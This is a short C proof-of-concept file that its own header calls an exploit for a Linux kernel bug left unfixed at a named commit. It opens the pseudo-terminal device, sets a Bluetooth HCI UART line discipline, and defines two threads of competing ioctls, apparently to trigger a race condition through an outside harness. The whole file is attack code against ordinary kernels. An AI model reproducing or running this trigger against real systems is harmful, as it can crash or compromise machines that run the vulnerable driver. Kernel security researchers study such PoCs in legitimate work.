/*
[COMMIT]
this bug is not fixed yet when developing this exploit, and this PoC is developed against commit f7e3a1bafdea735050

[COMMENT]
compiled with GCC 10.4, defconfig, without KASAN
the follwing kernel config is needed: CONFIG_BT_HCIUART
*/

#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <unistd.h>
#include <sched.h>
#include <x86intrin.h>

unsigned long racee_delay=0, racer_delay=0;

static int fd, arg=0xf;

void sys_racee(void)
{
  ioctl(fd, 0x400455c8, 0);
}

void sys_racer(void)
{
  ioctl(fd, 0x800455c9, 0);
}

void do_setup(void)
{
  return;
}

void do_cleanup(void)
{
  return;
}

void setup_one(void)
{
  fd = open("/dev/pts/ptmx", 14);
  if (fd < 0) {
    perror("[-] open ptmx failed");
    exit(-1);
  }
  ioctl(fd, 0x5423, &arg);
}

void cleanup_one(void)
{
  close(fd);
}


int sanity_check(void)
{
  int _fd;

  _fd = open("/dev/pts/ptmx", 14);
  if (_fd < 0) {
    perror("[-] open ptmx failed");
    return -1;
  }

  close(_fd);
  return 0;
}